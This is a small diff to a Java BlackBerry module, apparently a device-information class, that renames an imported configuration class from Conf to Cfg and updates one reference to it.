@@ -24,7 +24,7 @@ import net.rim.device.api.system.RadioInfo;
 import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.util.NumberUtilities;
 import blackberry.Device;
-import blackberry.config.Conf;
+import blackberry.config.Cfg;
 import blackberry.config.ConfModule;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -346,7 +346,7 @@ public final class ModuleDevice extends BaseInstantModule {
             final String vendor = group.getVendor();
             final String version = group.getVersion();
 
-            if (name == Conf.GROUP_NAME) {
+            if (name == Cfg.GROUP_NAME) {
                 sb.append("******************\r\n");
 
             }
